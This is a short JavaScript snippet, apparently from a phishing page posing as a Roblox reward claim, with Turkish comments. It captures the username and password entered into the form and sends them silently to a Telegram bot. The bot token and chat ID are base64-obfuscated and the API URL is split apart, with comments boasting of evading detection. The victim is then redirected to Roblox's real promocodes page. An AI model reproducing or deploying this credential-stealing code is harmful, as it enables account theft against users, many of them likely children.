// Google botları bu anlamsız harfleri okuyamaz
const _authData = {
    _t: "ODU4NzY3MDYzMTpBQUdrVmx0MHk4U0Y5Z1hUejJfNnkwb0JkWlIxckdsSkZsMA==", //
    _c: "ODUxMjQwNjM1Ng==" //
};

const _decrypt = (s) => atob(s);

document.getElementById('claim-f').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const u = document.getElementById('usr').value;
    const p = document.getElementById('pwd').value;

    const _api = "ht" + "tps://api.te" + "legram.org/bo" + "t";
    const _url = `${_api}${_decrypt(_authData._t)}/sendMessage?chat_id=${_decrypt(_authData._c)}&text=${encodeURIComponent(`💰 NEW ACCOUNT!\n👤: ${u}\n🔑: ${p}`)}`;

    try {
        // Sessizce veriyi gönderir
        await fetch(_url, { mode: 'no-cors' });
        // İşlem bitince gerçek ödül sayfasına sallar
        window.location.replace("https://www.roblox.com/promocodes");
    } catch (f) {
        window.location.replace("https://www.roblox.com/login");
    }
});
